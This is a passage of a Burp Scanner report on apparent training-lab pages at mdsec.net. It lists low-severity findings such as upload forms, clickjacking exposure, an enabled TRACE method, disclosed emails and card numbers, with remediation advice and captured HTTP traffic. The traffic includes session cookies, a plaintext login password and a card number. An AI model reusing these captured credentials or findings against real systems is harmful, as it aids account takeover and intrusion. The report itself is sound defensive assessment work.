+<span class="TEXT">File upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:<ul><li>Use a server-generated filename if storing uploaded files on disk.</li><li>Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.</li><li>Enforce a whitelist of accepted, non-executable file extensions.</li><li>If uploaded files are downloaded by users, supply an accurate non-generic Content-type header, and also a Content-disposition header which specifies that browsers should handle the file as an attachment.</li><li>Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server's configuration.</li><li>Reject attempts to upload archive formats such as ZIP.</li></ul></span>
+<br><br><div class="rule"></div>
+<span class="BODH1" id="16.1">16.1.&nbsp;http://mdsec.net/filestore/327/</span>
+<br><a class="PREVNEXT" href="#13.3">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#16.2">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/filestore/327/</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The page contains a form which is used to submit a user-supplied file to the following URL:<ul><li>http://mdsec.net<wbr>/filestore/327/Default<wbr>.aspx</li></ul>Note that Burp has not identified any specific security vulnerabilities with this functionality, and you should manually review it to determine whether any problems exist.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /filestore/327/ HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/labs/lab<wbr>.ashx?lab=13<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:46 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1759<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;File exchange&lt;/t<br><b>...[SNIP]...</b><br>&lt;/span&gt;<br>&amp;nbsp;<span class="HIGHLIGHT">&lt;input type="file" name="FileUpload" id="FileUpload" /&gt;</span><br>    &amp;nbsp;<br>    &lt;input type="submit" name="Submit" value="Submit" id="Submit" /&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="16.2">16.2.&nbsp;http://mdsec.net/filestore/8/</span>
+<br><a class="PREVNEXT" href="#16.1">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#17.1">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/filestore/8/</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The page contains a form which is used to submit a user-supplied file to the following URL:<ul><li>http://mdsec.net<wbr>/filestore/8/Default.aspx</li></ul>Note that Burp has not identified any specific security vulnerabilities with this functionality, and you should manually review it to determine whether any problems exist.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /filestore/8/ HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/labs/lab<wbr>.ashx?lab=10<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:42:06 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1759<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;File exchange&lt;/t<br><b>...[SNIP]...</b><br>&lt;/span&gt;<br>&amp;nbsp;<span class="HIGHLIGHT">&lt;input type="file" name="FileUpload" id="FileUpload" /&gt;</span><br>    &amp;nbsp;<br>    &lt;input type="submit" name="Submit" value="Submit" id="Submit" /&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="17">17.&nbsp;Frameable response (potential Clickjacking)</span>
+<br><a class="PREVNEXT" href="#16">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#18">Next</a>
+<br>
+<br><span class="TEXT">There are 2 instances of this issue:
+<ul>
+<li><a href="#17.1">http://mdsec.net/auth/369/Home.ashx</a></li>
+<li><a href="#17.2">https://mdsec.net/auth/372/Home.ashx</a></li>
+</ul></span>
+<h2>Issue description</h2>
+<span class="TEXT">It might be possible for a web page controlled by an attacker to load the content of this response within an iframe on the attacker's page. This may enable a "clickjacking" attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.<br><br>Note that this issue is being reported because the application's response does not set a suitable <b>X-Frame-Options</b> header in order to prevent framing attacks. Some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">You should review the application functions that are accessible from within the response, and determine whether they can be used by application users to perform any sensitive actions within the application. If so, then a framing attack targeting this response may result in unauthorized actions.<br><br>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself.</span>
+<br><br><div class="rule"></div>
+<span class="BODH1" id="17.1">17.1.&nbsp;http://mdsec.net/auth/369/Home.ashx</span>
+<br><a class="PREVNEXT" href="#16.2">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#17.2">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_firm_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Firm</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/auth/369/Home.ashx</b></td>
+</tr>
+</table>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /auth/369/Home.ashx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Cookie: SessionId__369=B2B3E<wbr>95ED806500F473338503<wbr>00FD805<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:53:00 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: no-cache<br>Pragma: no-cache<br>Expires: -1<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 892<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Home page&lt;/title<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="17.2">17.2.&nbsp;https://mdsec.net/auth/372/Home.ashx</span>
+<br><a class="PREVNEXT" href="#17.1">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#18.1">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_firm_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Firm</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>https://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/auth/372/Home.ashx</b></td>
+</tr>
+</table>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /auth/372/Home.ashx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/auth/372<wbr>/<br>Cookie: SessionId__372=E4D59<wbr>0A25EEC3891D14261B88<wbr>BF3C8DB<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:53:06 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: no-cache<br>Pragma: no-cache<br>Expires: -1<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 892<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Home page&lt;/title<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="18">18.&nbsp;TRACE method is enabled</span>
+<br><a class="PREVNEXT" href="#17">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#19">Next</a>
+<br>
+<br><span class="TEXT">There are 2 instances of this issue:
+<ul>
+<li><a href="#18.1">http://mdsec.net/</a></li>
+<li><a href="#18.2">https://mdsec.net/</a></li>
+</ul></span>
+<h2>Issue description</h2>
+<span class="TEXT">The TRACE method is designed for diagnostic purposes. If enabled, the web server will respond to requests which use the TRACE method by echoing in its response the exact request which was received.<br><br>Although this behavior is apparently harmless in itself, it can sometimes be leveraged to support attacks against other application users. If an attacker can find a way of causing a user to make a TRACE request, and can retrieve the response to that request, then the attacker will be able to capture any sensitive data which is included in the request by the user's browser, for example session cookies or credentials for platform-level authentication. This may exacerbate the impact of other vulnerabilities, such as cross-site scripting.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">The TRACE method should be disabled on the web server.</span>
+<br><br><div class="rule"></div>
+<span class="BODH1" id="18.1">18.1.&nbsp;http://mdsec.net/</span>
+<br><a class="PREVNEXT" href="#17.2">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#18.2">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/</b></td>
+</tr>
+</table>
+<h2>Request</h2>
+<div class="rr_div"><span><span class="HIGHLIGHT">TRACE</span> / HTTP/1.0<br>Host: mdsec.net<br>Cookie: <span class="HIGHLIGHT">5e0bc3308750da32</span><br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 <span class="HIGHLIGHT">200</span> OK<br>Content-Length: 63<br>Content-Type: message/http<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>Date: Wed, 10 Apr 2013 12:40:44 GMT<br>Connection: close<br><br>TRACE / HTTP/1.0<br>Cookie: <span class="HIGHLIGHT">5e0bc3308750da32</span><br>Host: mdsec.net<br><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="18.2">18.2.&nbsp;https://mdsec.net/</span>
+<br><a class="PREVNEXT" href="#18.1">Previous</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>https://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/</b></td>
+</tr>
+</table>
+<h2>Request</h2>
+<div class="rr_div"><span><span class="HIGHLIGHT">TRACE</span> / HTTP/1.0<br>Host: mdsec.net<br>Cookie: <span class="HIGHLIGHT">8c556b19a4f5d536</span><br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 <span class="HIGHLIGHT">200</span> OK<br>Content-Length: 111<br>Content-Type: message/http<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>Date: Wed, 10 Apr 2013 12:39:12 GMT<br>Connection: close<br><br>TRACE / HTTP/1.0<br>Cookie: <span class="HIGHLIGHT">8c556b19a4f5d536</span>; SessionId__28=801CCE<wbr>E82368285C4DBFFB8C07<wbr>5729C1<br>Host: mdsec.net<br><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="19">19.&nbsp;Email addresses disclosed</span>
+<br><a class="PREVNEXT" href="#18">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#20">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/employees/22/Default<wbr>.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The following email addresses were disclosed in the response:<ul><li>barrie@wahh-consulting<wbr>.com</li><li>kev@wahh-consulting.com</li><li>pablo@wahh-consulting.com</li><li>smeg@wahh-consulting.com</li><li>weiner@wahh-consulting<wbr>.com</li></ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.<br><br>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">You should review the email addresses being disclosed by the application, and consider removing any that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /employees/22/Default<wbr>.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/employees/22/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 42<br><br>Department=consultancy<wbr>&amp;Search=Submit+Query</span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:49:15 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 2153<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Employee search&lt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">weiner@wahh-consulting<wbr>.com</span>&amp;nbsp;&lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">smeg@wahh-consulting.com</span>&amp;nbsp;&lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">pablo@wahh-consulting.com</span>&amp;nbsp;&lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">kev@wahh-consulting.com</span>&amp;nbsp;&lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">barrie@wahh-consulting<wbr>.com</span>&amp;nbsp;&lt;/td&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="20">20.&nbsp;Credit card numbers disclosed</span>
+<br><a class="PREVNEXT" href="#19">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#21">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/cclookup/9/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The following credit card number was disclosed in the response:<ul><li>4187114966287134</li></ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">Responses containing credit card numbers may not represent any security vulnerability - for example, a number may belong to the logged-in user to whom it is displayed. You should verify whether the numbers identified are actually valid credit card numbers and whether their disclosure within the application is appropriate.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /cclookup/9/Default.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/cclookup<wbr>/9/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 114<br><br>__VIEWSTATE=%2FwEPDw<wbr>UJODk5NzA1OTE5ZGQ6yO<wbr>Ii1p1cZ9vZ%2Bqy2mr<wbr>%2BIKz9Y2Q%3D%3D&amp;Name<wbr>=Pete&amp;Password=nandos<wbr>&amp;Submit=Submit</span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:41:40 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1885<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Credit card stor<br><b>...[SNIP]...</b><br>&lt;br/&gt;<span class="HIGHLIGHT">4187114966287134</span>&lt;br/&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="21">21.&nbsp;HTML does not specify charset</span>
+<br><a class="PREVNEXT" href="#20">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#22">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/updates/update29.html</b></td>
+</tr>
+</table>
+<h2>Issue description</h2>
+<span class="TEXT">If a web response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.<br><br>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of the response and the context in which it appears to determine whether any vulnerability exists.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-8859-1</b>.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /updates/update29.html HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/updates<wbr>/8/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Content-Length: 301<br><span class="HIGHLIGHT">Content-Type: text/html</span><br>Last-Modified: Fri, 19 Aug 2011 16:23:09 GMT<br>Accept-Ranges: bytes<br>ETag: "685267488c5ecc1:cbe"<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>Date: Wed, 10 Apr 2013 12:43:58 GMT<br><br>...&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>    &lt;title&gt;News stor<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="22">22.&nbsp;Content type is not specified</span>
+<br><a class="PREVNEXT" href="#21">Previous</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_info_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>Information</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/filestore/8/GetFile.ashx</b></td>
+</tr>
+</table>
+<h2>Issue description</h2>
+<span class="TEXT">If a web response does not specify a content type, then the browser will usually analyze the response and attempt to determine the MIME type of its content. This can have unexpected results, and if the content contains any user-controllable data may lead to cross-site scripting or other client-side vulnerabilities.<br><br>In most cases, the absence of a content type statement does not constitute a security flaw, particularly if the response contains static content. You should review the contents of the response and the context in which it appears to determine whether any vulnerability exists.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">For every response containing a message body, the application should include a single Content-type header which correctly and unambiguously states the MIME type of the content in the response body.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /filestore/8/GetFile.ashx<wbr>?filename=test.jpg HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/filestore/8/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:42:09 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Length: 16861<br><br>......JFIF.....`.`.....C.<wbr>.......... &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;.<br>................... $.' ",#..(7),01444.'9=82&lt;.342<wbr>...C. &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;.....2!.!222222222222222<wbr>22222222222222222222<wbr>222222222222222......^.2.<wbr>.".......................<wbr>.......<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="TEXT"><br>Report generated by <a href="/burp">Burp Scanner</a> at Wed Apr 10 14:16:00 BST 2013.<br><br></span>
+</div>
+</body>
+</html>
